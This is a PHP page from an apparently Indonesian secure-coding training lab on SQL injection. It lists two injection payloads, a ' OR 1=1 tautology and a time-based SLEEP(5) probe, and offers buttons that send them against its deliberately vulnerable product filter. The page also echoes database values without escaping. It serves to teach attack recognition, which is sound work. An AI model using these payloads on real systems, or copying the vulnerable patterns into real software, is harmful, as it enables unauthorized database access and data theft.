<?php include 'getProduct.php'; ?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Coding</title>
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="../../assets/css/style.css" rel="stylesheet" type="text/css">
</head>

<body>

    <div class="container">
        <aside class="sidebar">
            <b>Parameter Hidden</b>
            <p>Pada studi kasus berikut terdapat kerentanan SQL Injection</p>
            <p>Adapun payload yang digunakan adalah:</p>
            <ul>
                <li>' OR 1=1 -- '</li>
                <li>' AND (SELECT 9482 FROM (SELECT(SLEEP(5)))bDVR) AND 'nudQ'='nudQ</li>
            </ul>


        </aside>

        <div class="main-content">
            <div class="filter">
                <span>Kategori:</span>
                <a href="<?php echo $host . '/sql-injection/lab-1'; ?>">
                    <button>Semua</button>
                </a>
                <a href="?category=pakaian">
                    <button>Pakaian</button>
                </a>
                <a href="?category=teknologi">
                    <button>Teknologi</button>
                </a>
                <a href="?category=elektronik">
                    <button>Elektronik</button>
                </a>
                |
                <a href="<?php echo $host; ?>/sql-injection">
                    <button>Back</button>
                </a>
            </div>

            <div class="product-grid">
                <?php
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) { ?>
                        <div class="product">
                            <img src="<?php echo $host . '/assets/gallery/lab-1/' . $row['thumbnail']; ?>">
                            <h4><?php echo $row['name']; ?> </h4>
                            <h6>Kategori: <?php echo $row['name']; ?> </h6>
                            <p class="price">Rp.<?php echo $row['price']; ?></p>
                            <button>View details</button>
                        </div>
                <?php }
                } else {
                    echo "Tidak ada produk yang ditemukan.";
                }
                ?>

            </div>
            <hr>
            <div class="right mt-1">
                <?php
                if ($category != null) {
                    $expCategory = explode("'", $category);
                    $payload = $host . "/sql-injection/lab-1?category=" . $expCategory[0] . "%27OR%201=1%20--%20%27";
                    $payload2 = $host . "/sql-injection/lab-1?category=" . $expCategory[0] . "%27%20AND%20(SELECT%209482%20FROM%20(SELECT(SLEEP(5)))bDVR)%20AND%20%27nudQ%27=%27nudQ";
                    echo '<a href="' . $payload . '"><button class="button-red" >Hack using Payload 1!</button></a>';
                    echo " | ";
                    echo '<a href="' . $payload2 . '"><button class="button-red" >Hack using Payload 2!</button></a>';
                }
                ?>

            </div>
        </div>
    </div>

</body>

</html>